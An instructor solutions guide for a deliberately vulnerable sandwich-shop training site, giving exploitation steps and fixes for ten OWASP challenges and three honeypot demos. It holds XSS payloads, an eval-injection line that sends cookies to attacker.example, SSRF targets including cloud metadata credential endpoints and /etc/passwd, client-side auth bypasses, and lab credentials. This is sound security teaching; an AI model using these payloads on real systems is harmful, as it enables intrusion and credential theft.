# The Sub Shop — Instructor Solutions Guide

> **FOR INSTRUCTORS ONLY.** Keep this file out of student-accessible directories.  
> All 10 OWASP challenges + 3 honeypot gotchas are documented below with exact exploitation steps, working payloads, known bugs, and fix explanations.

---

## OWASP Challenges

---

### Challenge #1 · A01 — Broken Access Control
**Page:** `pages/menu.html`  
**Difficulty:** Intermediate

#### How it works
Role is read from the URL query string (`?role=admin`) in client-side JavaScript. No server session is checked. Anyone who knows the parameter can see the hidden admin panel.

#### Exploitation steps
1. Navigate to `pages/menu.html`
2. Append `?role=admin` to the URL:
   ```
   http://localhost:8000/pages/menu.html?role=admin
   ```
3. The hidden admin panel appears showing internal pricing, margins, and unreleased items ("The Devastator")
4. Click **✓ Mark Challenge #1 Complete**

#### Vulnerable code (`menu.html`)
```js
const params = new URLSearchParams(window.location.search);
const role = params.get('role');          // attacker-controlled
if (role === 'admin') {
  document.getElementById('admin-panel').classList.remove('hidden');
}
```

#### Real-world fix
Validate roles server-side via an authenticated session token. Never trust a URL parameter, cookie, or hidden field to grant elevated access.

---

### Challenge #2 · A02 — Cryptographic Failures
**Page:** `pages/loyalty.html`  
**Difficulty:** Intermediate

#### How it works
The loyalty token is `btoa(JSON.stringify(payload))` — Base64 encoding, not encryption. It is stored in `localStorage` and contains email, points, tier, SSN, and a full card number.

#### Exploitation — Method A (UI button)
1. Navigate to `pages/loyalty.html`
2. Click **Decode Token**
3. The decoded JSON appears on screen including SSN `555-12-3456` and card `4532-1234-5678-9012`
4. Click **✓ Mark Challenge #2 Complete**

#### Exploitation — Method B (DevTools Console)
```js
atob(localStorage.getItem('loyalty_token'))
```
Returns:
```json
{"username":"jane.doe@subshop.com","points":750,"tier":"gold","ssn":"555-12-3456","card":"4532-1234-5678-9012","issued":"2026-01-15T09:00:00Z"}
```

#### Exploitation — Method C (image metadata forensics — bonus)
The file `assets/sub1.png` has a PNG tEXt `UserToken` chunk containing the same Base64 token:
```python
python -c "from PIL import Image; print(Image.open('assets/sub1.png').info)"
```
Output includes `UserToken: eyJlbWFpbCI6ImphbmUu...`

#### Real-world fix
Never store PII client-side. Use server-side sessions. If a client token is unavoidable, use a signed JWT (HS256/RS256) and never include sensitive fields in the payload. PII must only be on the server.

---

### Challenge #3 · A03 — Injection (DOM-Based XSS)
**Page:** `pages/search.html`  
**Difficulty:** Intermediate

#### How it works
The `q` URL parameter is written directly into `element.innerHTML` with no sanitization. Any HTML or JavaScript in the search term is rendered and executed.

#### Exploitation — Method A (URL bar)
1. Navigate to `pages/search.html`
2. Enter in the URL (or the search box):
   ```
   <img src=x onerror="window._xssFlag()">
   ```
3. An alert fires and the green completion banner appears
4. Click **✓ Mark Challenge #3 Complete**

#### Exploitation — Method B (Console command)
To mark complete from the console after any XSS fires:
```js
window._xssFlag()
```

#### Working payloads
| Payload | Effect |
|---------|--------|
| `<img src=x onerror=alert(1)>` | Fires alert — confirms XSS |
| `<img src=x onerror="window._xssFlag()">` | Fires alert **and** reveals completion button |
| `<img src=x onerror="alert(document.cookie)">` | Shows cookies |
| `<script>alert('xss')</script>` | May not fire (browser blocks inline script injection via innerHTML) — use `img onerror` instead |

#### Vulnerable code (`search.html`)
```js
header.innerHTML = `Showing results for: <strong>${q}</strong>`;  // unsanitized!
```

#### ⚠️ Known Bug — Preset Button
The hint panel has a button that fires `<img src=x onerror=alert(1)>`. This demonstrates XSS (the alert fires) but does **not** reveal the Mark Complete button because it doesn't call `window._xssFlag()`. Students must use the payload `<img src=x onerror="window._xssFlag()">` or call `window._xssFlag()` from the console to unlock the button.

#### Real-world fix
Use `element.textContent` instead of `innerHTML` for user-supplied strings. If HTML rendering is required, sanitize with DOMPurify before insertion.

---

### Challenge #4 · A04 — Insecure Design
**Page:** `pages/order.html`  
**Difficulty:** Intermediate

#### How it works
The item price is stored in a `<input type="hidden" id="item-price">` field. The `submitOrder()` function reads the price directly from this hidden field. An attacker can edit it in DevTools before submitting.

#### Exploitation steps
1. Navigate to `pages/order.html`
2. Select any sub (e.g. Classic Italian — price populates as `$12.99`)
3. Open **DevTools → Elements** (F12 → Elements tab)
4. Use Ctrl+F to search for `item-price`, or right-click the "Order Total" display and choose **Inspect**
5. Find: `<input type="hidden" id="item-price" name="price" value="12.99">`
6. Double-click `12.99` and change it to `0.01`
7. Click **Place Order →**
8. The "Tampered price detected!" warning appears in the confirmation panel
9. Click **✓ Mark Challenge #4 Complete**

#### Console shortcut
```js
document.getElementById('item-price').value = '0.01';
document.getElementById('order-form').dispatchEvent(new Event('submit', {bubbles:true, cancelable:true}));
```
> Note: `dispatchEvent` fires the `onsubmit` handler. Alternatively just modify the value and click the button manually.

#### Real-world fix
Never include price in a client-submitted form field. Look up the canonical price from the item ID server-side at checkout time. The client submits an item ID, the server computes the price.

---

### Challenge #5 · A05 — Security Misconfiguration
**Page:** `pages/admin.html`  
**Difficulty:** Intermediate

#### How it works
Admin credentials are left in a JS comment in the shipped source code, visible to anyone who views the page source.

#### Method A — View Source
1. Navigate to `pages/admin.html`
2. Press **Ctrl+U** (View Page Source) or right-click → **View Page Source**
3. Scroll to the `<script>` block and find:
   ```js
   // TODO: Remove these before deploying to production!!  — @dev 2026-03-01
   // Temp admin credentials for staging environment:
   //   username : admin
   //   password : SubShop2026!
   ```
4. Use those credentials in the login form
5. Click **✓ Mark Challenge #5 Complete**

#### Method B — Read JS object
The `ADMIN_USERS` object in the source also includes the manager account:
- `admin` / `SubShop2026!`
- `manager` / `LetMeIn#99`

#### Method C — Image metadata (bonus)
`assets/sandwiches.png` contains the credentials in a PNG tEXt `Comment` chunk:
```python
python -c "from PIL import Image; print(Image.open('assets/sandwiches.png').info)"
```
Returns: `'Comment': 'TEMP: using staging creds for upload — admin:SubShop2026! — remove before prod deploy!! -dev'`

#### Real-world fix
Credentials must never appear in source code, comments, or committed files. Use environment variables, secrets managers (AWS Secrets Manager, Vault, etc.), and pre-commit hooks to detect credential leaks.

---

### Challenge #6 · A06 — Vulnerable & Outdated Components
**Page:** `pages/recipes.html`  
**Difficulty:** Advanced

#### How it works
The page loads `subutils-1.2.3.min.js`, which has a documented CVE (CVE-2023-18912, CVSS 9.8). `SubUtils.parseIngredients()` passes its argument to `eval()` without sanitization.

#### Exploitation — Method A (UI button)
1. Navigate to `pages/recipes.html`
2. Click **Try CVE Payload** in the Ingredient Parser Tool
3. The pre-built payload executes; an `alert()` fires and the CVE banner appears
4. Click **✓ Mark Challenge #6 Complete**

#### Exploitation — Method B (custom payload via textarea)
Paste into the "Raw Ingredient String" textarea and click **Parse Ingredient**:
```js
(function(){ alert("RCE via CVE-2023-18912"); document.getElementById('cve-banner').classList.remove('hidden'); })()
```

#### Exploitation — Method C (DevTools Console)
```js
SubUtils.parseIngredients('(function(){ alert("pwned"); })()');
// Or exfil cookies:
SubUtils.parseIngredients('(()=>{ fetch("https://attacker.example/?c=" + document.cookie) })()');
```

#### Vulnerable code (`subutils-1.2.3.min.js`)
```js
parseIngredients: function(str) {
  try { return eval("(" + str + ")") } catch(e) { return null }
}
```

#### Real-world fix
Run `npm audit` regularly. Update `subutils` to `>= 2.0.1` where `eval()` is replaced with `JSON.parse()` + schema validation. Pin dependency versions and automate vulnerability scanning (Dependabot, Snyk).

---

### Challenge #7 · A07 — Identification & Authentication Failures
**Page:** `pages/login.html`  
**Difficulty:** Advanced

#### How it works
Three independent vulnerabilities:
1. Credentials are hardcoded in the client-side `STAFF_CREDS` JS object
2. No rate limiting, lockout, or CAPTCHA
3. Auth state is stored in `localStorage` and never verified server-side

#### Method A — Read page source
View page source (Ctrl+U) and find:
```js
const STAFF_CREDS = {
  'admin':   'password123',
  'jsmith':  'SubShop1!',
  'prep01':  'sandwich',
  'manager': 'letmein2024',
};
```
Use any credential pair to log in.

#### Method B — LocalStorage bypass (no password required)
Open DevTools Console and run:
```js
localStorage.setItem('subshop_auth', JSON.stringify({user:'hacker', role:'admin'}));
location.reload();
```
The page will show "Authenticated as hacker" with the bypass method message.

#### Method C — Brute force (no lockout)
There is no cap on failed attempts. After 3 failures the counter displays but enforces nothing. A script could cycle through thousands of passwords without restriction.

> **Note:** `admin` credentials differ on `login.html` (`password123`) vs `admin.html` (`SubShop2026!`) — these are intentionally separate challenge pages.

#### Real-world fix
Store only password hashes (bcrypt/Argon2) server-side. Implement account lockout (5 failed attempts → 15 min delay). Use signed, HttpOnly session cookies — never store auth state in localStorage. Add MFA for privileged accounts.

---

### Challenge #8 · A08 — Software & Data Integrity Failures
**Page:** `pages/cart.html`  
**Difficulty:** Advanced

#### How it works
Cart contents and prices are stored in `localStorage` as plain JSON with no HMAC signature or server-side verification. The checkout function trusts whatever prices are in `localStorage` at time of checkout.

#### Exploitation — Method A (DevTools Application tab)
1. Navigate to `pages/cart.html` (a default cart is auto-seeded on first visit)
2. Open **DevTools → Application → Local Storage → http://localhost:8000**
3. Find the key `subshop_cart`
4. Click the value, edit any `"price"` field (e.g. change `12.99` to `0`)
5. Press **F5** to reload
6. The tampered price appears in red and the Tampered warning fires
7. Click **✓ Mark Challenge #8 Complete**

#### Exploitation — Method B (Console one-liner)
```js
localStorage.setItem('subshop_cart', JSON.stringify([
  {name: 'Classic Italian', price: 0, qty: 1},
  {name: 'Turkey Club',     price: 0, qty: 2}
]));
location.reload();
```

#### Exploitation — Method C (negative total)
```js
localStorage.setItem('subshop_cart', JSON.stringify([
  {name: 'Classic Italian', price: -99.99, qty: 1}
]));
location.reload();
```
The checkout total shows **-$99.99** — the backend would owe the customer money.

#### Real-world fix
Cart state must be stored server-side, associated with a session. At checkout, the server looks up canonical prices from the product database by item ID, ignoring any client-submitted price. Optionally use an HMAC-signed cart token to detect client-side tampering early.

---

### Challenge #9 · A09 — Security Logging & Monitoring Failures
**Page:** `pages/feedback.html`  
**Difficulty:** Advanced

#### How it works
The feedback form accepts free-form input including a "Payment Reference" field (no format validation). On submit, the entire payload is logged to `console.log()` in cleartext and stored verbatim in `localStorage`. A full card number entered in the Payment Reference field appears unmasked everywhere.

#### Exploitation steps
1. Navigate to `pages/feedback.html`
2. Open **DevTools → Console** tab (F12)
3. Fill in the form:
   - Name: `Test User`
   - Email: `test@test.com`
   - Payment Reference: `4532-1234-5678-9012`
4. Click **Submit Feedback**
5. Observe the Console — full JSON including the card number is logged:
   ```
   [SubShop Feedback] New submission received: { "payment": "4532-1234-5678-9012", ... }
   [SubShop Feedback] Payment field value: 4532-1234-5678-9012
   ```
6. Check **Application → Local Storage** — there's a `subshop_feedback_<timestamp>` key with the full unmasked data
7. Click **✓ Mark Challenge #9 Complete**

#### Real-world fix
Never log PII. Mask payment data before any storage (log/DB/analytics) — store only the last 4 digits. Validate and reject card-pattern strings in non-payment fields. Implement log monitoring/alerting for anomalous input patterns (e.g. Luhn-valid card numbers in unexpected fields).

---

### Challenge #10 · A10 — Server-Side Request Forgery (SSRF)
**Page:** `pages/suppliers.html`  
**Difficulty:** Advanced

#### How it works
A user-supplied URL is passed directly to `fetch()` with no allowlist, no hostname check, and no scheme validation. The fetch fires even for `localhost`, private IPs, and internal endpoints. (Browser CORS blocks the response body in this client-side demo, but the request itself is sent — check DevTools → Network. On a real server-side implementation there is no CORS protection.)

#### Exploitation steps
1. Navigate to `pages/suppliers.html`
2. Click any of the preset payload buttons, or enter a URL manually:
   - **`http://localhost`** — attempts to reach the local web server
   - **`http://127.0.0.1:8080/admin`** — internal admin interface
   - **`http://169.254.169.254/latest/meta-data/iam/security-credentials/`** — AWS IMDSv1 IAM token
   - **`http://metadata.google.internal/computeMetadata/v1/instance/...`** — GCP metadata
   - **`file:///etc/passwd`** — local file read (server-side only)
3. Click **Fetch Status**
4. Observe: the request fires (visible in DevTools → Network tab). Response body is CORS-opaque in-browser, but the SSRF banner explains server-side impact.
5. Click **✓ Mark Challenge #10 Complete**

#### Vulnerable code (`suppliers.html`)
```js
const url = document.getElementById('supplier-url').value; // user-controlled, no validation
const response = await fetch(url, { mode: 'no-cors' });     // fires regardless of destination
```

#### Real-world fix
Validate the URL against an explicit allowlist of approved supplier hostnames before fetching. Block private IP ranges (RFC 1918), loopback addresses, and non-HTTPS schemes at the application layer. For cloud workloads, enable IMDSv2 (requires token) and firewall the metadata endpoint.

---

## Honeypot Gotchas

> These are not OWASP-mapped challenges. They trigger on natural attacker or careless-user behaviour and reveal themselves with a security lesson.

---

### Gotcha #1 — Fake Malware Download
**Page:** `pages/admin.html` (must be logged in first)  
**Trigger:** Click the **"↓ Export Logs & Staff Roster"** button in the Admin Tools section

#### Trigger path
1. Complete Challenge #5 or bypass login to reach the admin dashboard
2. Scroll to "Admin Tools" below the Mark Complete button
3. Click **"↓ Export Logs & Staff Roster"**
4. A full-screen ransomware simulation overlay appears:
   - Fake terminal scrolls through encryption of 14,892 files
   - Ransom note appears demanding 0.5 BTC
   - After **9 seconds** (or any keypress), the reveal slides in
5. Lesson: *Never download files from untrusted admin panels, even when the button looks routine.*

#### Revealing early
Press any key while the terminal is scrolling to skip straight to the lesson reveal.

#### Instructor note
The overlay uses `position:fixed; z-index:9999` and covers the entire viewport. `closeMalwareTrap()` hides it. Nothing is actually downloaded; all output is DOM-generated JS.

---

### Gotcha #2 — Phishing Link
**Page:** `pages/login.html` → `pages/phishing.html`  
**Trigger:** Click the subtle **"Forgot your password? Reset it here →"** link below the sign-in form

#### Trigger path
1. Navigate to `pages/login.html`
2. Look below the Sign In button for the muted-text link: *"Forgot your password? Reset it here →"*
3. Click it — arrives at `pages/phishing.html`
4. The page looks identical to the real login but at a different URL (`phishing.html` vs `login.html`)
5. Enter any username and password and click **Verify & Continue**
6. After a 1.3-second "Verifying…" delay, the reveal shows the captured credentials and highlights the URL difference
7. Lesson: *Always check the full URL before entering credentials.*

#### Instructor note
The phishing page displays the submitted username and password back to the student in the reveal panel, making the credential-capture concrete and visceral. No data leaves the browser.

---

### Gotcha #3 — Poisoned Cookie
**Page:** `pages/loyalty.html`  
**Trigger:** Click the **"🥤 Claim Free Drink — Limited Offer"** button in the Redeem Rewards panel

#### Trigger path
1. Navigate to `pages/loyalty.html`
2. In the Redeem Rewards table, click **"🥤 Claim Free Drink — Limited Offer"**
3. The browser silently sets: `admin_override=true; path=/; SameSite=Lax`
4. The page reloads automatically
5. A red warning banner appears: *"⚠ Suspicious cookie detected: admin_override=true — this action has been logged"*
6. The banner also appears on **every other page** the student navigates to (injected by `main.js`)
7. Lesson: *Cookies are not invisible. Don't assume you can set one without the server detecting it.*

#### Resetting
Open DevTools → Application → Cookies → delete `admin_override` and reload.

#### Instructor note
The cookie is a session cookie (no `Expires` attribute) — it clears when the browser closes. The warning persists site-wide via the global sentinel in `main.js` as long as the cookie exists, reinforcing that every request carries it.

---

## Known Bugs & Instructor Workarounds

| # | Challenge | Issue | Workaround |
|---|-----------|-------|------------|
| 1 | **Ch. #3 — XSS** | The preset "Try XSS" button fires `<img src=x onerror=alert(1)>` which demonstrates XSS but does **not** reveal the "Mark Complete" button — because the payload calls `alert(1)` instead of `window._xssFlag()`. | Tell students to use the payload: `<img src=x onerror="window._xssFlag()">` — or just call `window._xssFlag()` from the console after any XSS fires. The button will appear. |

---

## Quick Reference — All Credentials & Payloads

| Challenge | Credential / Payload |
|-----------|----------------------|
| A01 | `?role=admin` in URL |
| A02 | `atob(localStorage.getItem('loyalty_token'))` in console |
| A03 | `<img src=x onerror="window._xssFlag()">` in search |
| A04 | Change `item-price` hidden input to `0.01` in DevTools Elements |
| A05 (source) | `admin` / `SubShop2026!` — `manager` / `LetMeIn#99` |
| A07 (source) | `admin` / `password123` — `jsmith` / `SubShop1!` — `manager` / `letmein2024` |
| A07 (bypass) | `localStorage.setItem('subshop_auth', JSON.stringify({user:'hacker',role:'admin'})); location.reload()` |
| A08 | Edit `subshop_cart` in Application → LocalStorage (change price to `0`) |
| A09 | Submit feedback with `4532-1234-5678-9012` in Payment Reference; check Console |
| A10 | Enter `http://localhost` in Supplier URL and click Fetch Status |
| A06 (CVE) | Click "Try CVE Payload" button, or paste `(function(){ alert("pwned"); })()` into ingredient parser |
| Gotcha #1 | Log in to admin dashboard → "Export Logs & Staff Roster" |
| Gotcha #2 | Login page → "Reset it here →" link → submit any credentials |
| Gotcha #3 | Loyalty page → "🥤 Claim Free Drink" button |

---

## Running the Lab

```powershell
cd C:\Users\mlingsch\Apps\SubShop
python -m http.server 8000
# Open: http://localhost:8000
```

Progress is stored per-browser in `localStorage` key `subshop_progress`. Reset anytime via the **Reset Progress** button on the challenge board, or:
```js
localStorage.removeItem('subshop_progress'); location.reload();
```
